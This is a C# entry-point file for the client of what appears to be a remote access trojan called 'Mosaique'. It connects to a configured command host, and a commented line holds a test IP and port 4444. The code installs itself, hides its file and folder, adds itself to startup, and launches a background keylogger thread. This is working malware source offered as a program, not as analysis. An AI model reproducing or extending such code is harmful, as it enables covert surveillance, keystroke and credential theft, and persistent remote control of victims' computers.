using Client.Controllers;
using Client.Controllers.Tools;
using Client.Models;
using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using ZeroFormatter.Formatters;

namespace Client
{
    static class Program
    {
        public static ClientMosaique client;
        private static ApplicationContext _msgLoop; // KEYLOGGER
        private static bool _result;

        /// <summary>
        /// Point d'entrée principal de l'application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            #region ifProd
            Boot.Initialization();

            MutexController.mutexKey = Boot.mutex;

            client = new ClientMosaique(Boot.host, Boot.port);
            #endregion

            #region ifPreProd
            //MutexController.mutexKey = "sdfmlksdmflksdfmlkQQSDQSd5454654EZEZEZZE";
            //client = new ClientMosaique("192.168.8.100", 4444);
            #endregion


            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            if (MosaiqueLauncher())
            {
                client.connect();
            }
        }

        private static bool MosaiqueLauncher()
        {
            _result = MutexController.createMutex();// TODO virer

            if (!_result) // TODO virer
            {
                MessageBox.Show("Another instance of application is already running !");
                return false;
            }

            ClientData.installPath = Path.Combine(Boot.DIRECTORY, ((!string.IsNullOrEmpty(Boot.installSubDirectory)) ? Boot.installSubDirectory + @"\" : "") + Boot.installFileName); // 

            // If install == false OR already installed
            if(!Boot.installStub || ClientData.currentPath == ClientData.installPath) 
            {
                if(Boot.installStub && Boot.hideFile) // INSTALL
                {
                    try
                    {
                        File.SetAttributes(ClientData.currentPath, FileAttributes.Hidden);
                    }
                    catch
                    {
                    }
                }
                if(Boot.installStub && Boot.hideSubDirectory && !string.IsNullOrEmpty(Boot.installSubDirectory)) // INSTALL
                {
                    try
                    {
                        DirectoryInfo di = new DirectoryInfo(Path.GetDirectoryName(ClientData.installPath));
                        di.Attributes |= FileAttributes.Hidden;
                    }
                    catch
                    {

                    }
                }

                if (Boot.autoStartEnabled) // STARTUP
                {
                    if (!ClientInstallerController.AddToStartup())
                        ClientData.AddToStartupFailed = true;
                }
                if (Boot.keyloggerEnabled) // KEYLOGGER
                {
                    new Thread(() =>
                    {
                        _msgLoop = new ApplicationContext();
                        Keylogger logger = new Keylogger(15000);
                        Application.Run(_msgLoop);
                    })
                    { IsBackground = true }.Start();
                }

                return true;
            }
            else
            {
                MutexController.closeMutex();
                ClientInstallerController.install();
                return false;
            }
        }
    }
}
